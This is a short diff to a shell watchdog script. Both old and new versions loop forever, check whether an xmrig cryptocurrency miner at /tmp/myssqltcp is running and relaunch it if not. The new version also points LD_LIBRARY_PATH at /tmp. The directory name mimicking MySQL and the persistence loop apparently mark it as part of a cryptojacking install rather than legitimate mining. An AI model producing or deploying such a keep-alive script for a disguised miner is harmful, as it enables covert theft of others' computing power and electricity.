@@ -1,16 +1,17 @@
-#!/bin/bash
+#!/bin/sh
 
-VERSION=2.11
-while true
-do
-ps -ef | grep "/tmp/myssqltcp/xmrig" | grep -v "grep"
-if [ "$?" -eq 1 ]
-then
 
-echo "$(date "+%Y-%m-%d_%H:%M:%S") restart..." >> /tmp/timelog.log
+export LD_LIBRARY_PATH=/tmp
 
-cd /tmp/myssqltcp/ && ./xmrig.sh
-fi
-# 每10秒检查一次
-sleep 10
+while true; do
+      
+        server=`ps aux | grep /tmp/myssqltcp/xmrig | grep -v grep`
+        if [ ! "$server" ]; then
+          
+            cd /tmp/myssqltcp/ && ./xmrig.sh
+           
+            sleep 10
+        fi
+    
+        sleep 5
 done
